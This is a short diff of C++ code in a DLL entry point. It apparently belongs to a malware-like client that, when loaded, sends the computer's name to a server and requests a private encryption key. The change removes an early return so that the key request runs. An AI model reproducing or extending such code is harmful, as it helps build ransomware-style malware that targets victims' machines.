@@ -74,7 +74,6 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 
 		me.SendComputerNameToServer();
 		me.~Client();
-		return FALSE;
 
 		ClientRequest req(ClientRequest::REQUEST_PRIVATE_ENCRYPTION_KEY, me.GetSocket(TCP));
 		//me.SendEncryptedMessageToServer(me.TCPServerDetails, req);
